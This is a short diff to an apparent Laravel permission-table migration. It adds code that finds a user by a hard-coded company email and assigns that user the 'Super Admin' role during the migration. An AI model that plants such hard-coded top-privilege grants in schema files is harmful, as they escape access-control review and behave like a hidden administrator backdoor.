@@ -3,6 +3,7 @@
 use Illuminate\Support\Facades\Schema;
 use Illuminate\Database\Schema\Blueprint;
 use Illuminate\Database\Migrations\Migration;
+use App\Models\User;
 
 return new class extends Migration
 {
@@ -118,6 +119,11 @@ return new class extends Migration
         app('cache')
             ->store(config('permission.cache.store') != 'default' ? config('permission.cache.store') : null)
             ->forget(config('permission.cache.key'));
+
+        $user = User::where('email','devops.interno@maxisistemas.com.ar')->first();
+        if ($user) {
+            $user->assignRole('Super Admin');
+        }
     }
 
     /**
